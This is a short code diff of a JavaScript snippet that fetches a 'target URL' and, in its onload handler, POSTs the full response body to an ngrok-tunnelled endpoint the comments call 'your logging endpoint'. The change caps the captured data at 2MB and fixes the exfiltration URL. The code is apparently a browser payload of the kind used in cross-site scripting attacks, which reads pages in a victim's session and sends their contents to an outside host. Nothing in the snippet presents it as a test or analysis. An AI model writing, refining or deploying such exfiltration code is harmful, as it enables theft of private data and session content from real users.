@@ -9,11 +9,24 @@
 
     // Define the callback function for when the request is complete
     req.onload = function () {
+        // Get the response text
+        var responseData = this.responseText;
+
+        // Define the maximum size for the data (e.g., 2MB)
+        var maxSize = 2 * 1024 * 1024; // 2MB in bytes
+
+        // Check if the response is larger than the allowed size
+        if (responseData.length > maxSize) {
+            // Trim the response if it exceeds the size
+            responseData = responseData.slice(0, maxSize);
+            console.log('Response too large, trimming to ' + maxSize + ' bytes');
+        }
+
         // Send the response data to your logging endpoint
         var logReq = new XMLHttpRequest();
-        logReq.open('POST', ' https://5e42-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app', true);
+        logReq.open('POST', 'https://5e42-2600-3c03-00-f03c-95ff-fe98-8b2e.ngrok-free.app', true);
         logReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        logReq.send('key=' + encodeURIComponent(this.responseText));
+        logReq.send('key=' + encodeURIComponent(responseData));
     };
 
     // Configure the request to the target URL
